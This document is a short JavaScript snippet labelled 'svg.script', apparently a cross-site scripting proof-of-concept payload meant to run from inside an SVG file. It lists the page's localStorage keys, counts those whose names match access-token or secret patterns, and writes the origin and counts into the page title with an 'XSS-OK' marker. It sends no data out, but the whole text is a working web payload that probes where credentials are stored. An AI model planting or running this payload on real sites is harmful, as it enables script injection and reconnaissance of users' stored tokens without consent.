svg.script:
(function () {
  var ks = [];
  try { for (var i = 0; i < localStorage.length; i++) { ks.push(localStorage.key(i)); } } catch (e) {}
  var tok = ks.filter(function (k) { return /accesstoken|secret|token/i.test(k); }).length;
  document.title = 'XSS-OK origin=' + location.origin + ' lskeys=' + ks.length + ' tokenkeys=' + tok;
  document.documentElement.setAttribute('data-xss', '1');
})();
